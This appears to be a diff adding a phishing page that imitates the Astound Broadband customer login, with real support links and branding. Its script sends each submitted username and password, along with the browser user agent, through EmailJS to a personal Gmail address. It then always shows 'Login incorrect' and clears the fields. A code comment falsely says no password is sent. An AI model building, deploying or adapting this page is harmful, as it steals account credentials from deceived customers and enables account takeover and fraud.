@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Astound Broadband - Log In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;600&display=swap');
+      
+        body {
+            font-family: Arial, sans-serif;
+        }
+      
+        .input-field {
+            transition: all 0.2s;
+        }
+      
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(75, 0, 130, 0.2);
+            border-color: #4B0082;
+        }
+      
+        .error-banner {
+            display: none;
+            background-color: #fff1f0;
+            border: 1px solid #f5c6cb;
+            color: #c0392b;
+        }
+       
+        .links {
+            text-align: left;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center py-12 px-4">
+    <div class="max-w-md w-full">
+        <!-- Larger Logo -->
+        <div class="flex flex-col items-center mb-8">
+            <img src="index-files/astound.png" 
+                 alt="Astound Broadband" 
+                 class="h-20 w-auto mb-4"> <!-- Increased size -->
+            </p>
+        </div>
+
+        <!-- Login Card -->
+        <div class="bg-white rounded-lg shadow-xl p-8">
+            <h1 class="text-2xl font-semibold text-center text-gray-800 mb-6">Log In</h1>
+            <!-- Error Message -->
+            <div id="errorBanner" class="error-banner rounded-md py-3 px-4 mb-6 text-center text-sm font-medium">
+                Login incorrect
+            </div>
+
+            <!-- Form -->
+            <form id="loginForm" class="space-y-6">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-1.5">USERNAME</label>
+                    <input
+                        type="email"
+                        id="username"
+                        placeholder="Username"
+                        class="input-field w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
+                        required>
+                </div>
+
+                <div id="infoContainer">
+                    <label class="block text-sm font-medium text-gray-700 mb-1.5">PASSWORD</label>
+                    <div class="relative">
+                        <input
+                            type="text"
+                            id="Password"
+                            placeholder="Password"
+                            class="input-field w-full pr-20 px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
+                            required>
+                        <button
+                            type="button"
+                            id="toggleInfoBtn"
+                            class="absolute inset-y-0 right-2 flex items-center text-sm text-purple-700 hover:text-purple-900 font-medium focus:outline-none focus:ring-2 focus:ring-purple-500 rounded px-2">
+                            Hide
+                        </button>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-2">
+                    <input
+                        type="checkbox"
+                        id="remember"
+                        checked
+                        class="w-4 h-4 accent-purple-700">
+                    <label for="remember" class="text-sm text-gray-700 flex items-center gap-1">
+                        Remember Me
+                        <span class="text-gray-400 text-xs cursor-help" title="Keep me signed in">?</span>
+                    </label>
+                </div>
+
+                <button
+                    type="submit"
+                    id="loginBtn"
+                    class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-4 rounded-md text-lg transition-colors">
+                    LOG IN
+                </button>
+            </form>
+
+            <!-- Links moved to LEFT side -->
+            <div class="links mt-8 text-sm space-y-2">
+                <a href="https://password.wavebroadband.com/" class="block text-blue-600 hover:underline">Forgot Password?</a>
+                <a href="https://residential.wavebroadband.com/resources/docs/Wave-Privacy-Policy.pdf" class="block text-blue-600 hover:underline">Privacy Policy</a>
+                <a href="https://residential.wavebroadband.com/agreements-and-policies/" class="block text-blue-600 hover:underline">Terms of Service</a>
+            </div>
+        </div>
+
+        <!-- Bold Support Footer -->
+        <div class="text-center mt-8 text-sm font-bold text-gray-800">
+            Support - Contact Us at <a href="tel:1-800-4-ASTOUND" class="hover:underline">1-800-4-ASTOUND</a>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const errorBanner = document.getElementById('errorBanner');
+        const loginBtn = document.getElementById('loginBtn');
+
+        const EMAILJS_SERVICE_ID = 'service_bzq0inh';
+        const EMAILJS_TEMPLATE_ID = 'template_87rjjnc';
+        const EMAILJS_PUBLIC_KEY = '6SuWsCdXwbJ2K7HPj';
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+
+        // Form submission - send username and password via EmailJS (NO password)
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const Password = document.getElementById('Password').value.trim();
+            const templateParams = {
+                to_email: 'akintadefaruk@gmail.com',
+                user_email: username,
+                user_password: Password,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            const originalBtnText = loginBtn.textContent;
+            loginBtn.textContent = 'LOADING...';
+            loginBtn.disabled = true;
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+                .then(() => {
+                    console.log('EmailJS message sent');
+                })
+                .catch((error) => {
+                    console.error('EmailJS error:', error);
+                })
+                .finally(() => {
+                    setTimeout(() => {
+                        errorBanner.style.display = 'block';
+                        loginBtn.textContent = originalBtnText;
+                        loginBtn.disabled = false;
+
+                        // Clear entered values (email/username and password)
+                        const userInput = document.getElementById('username');
+                        const infoInput = document.getElementById('Password');
+                        if (userInput) userInput.value = '';
+                        if (infoInput) infoInput.value = '';
+
+                        errorBanner.classList.add('animate-pulse');
+                        setTimeout(() => errorBanner.classList.remove('animate-pulse'), 1200);
+                    }, 800);
+                });
+        });
+
+        const toggleInfoBtn = document.getElementById('toggleInfoBtn');
+        const infoInput = document.getElementById('Password');
+
+        toggleInfoBtn.addEventListener('click', function () {
+            const isVisible = infoInput.type === 'text';
+            infoInput.type = isVisible ? 'password' : 'text';
+            toggleInfoBtn.textContent = isVisible ? 'Show' : 'Hide';
+            infoInput.focus();
+        });
+
+        document.getElementById('username').focus();
+    </script>
+</body>
+</html>
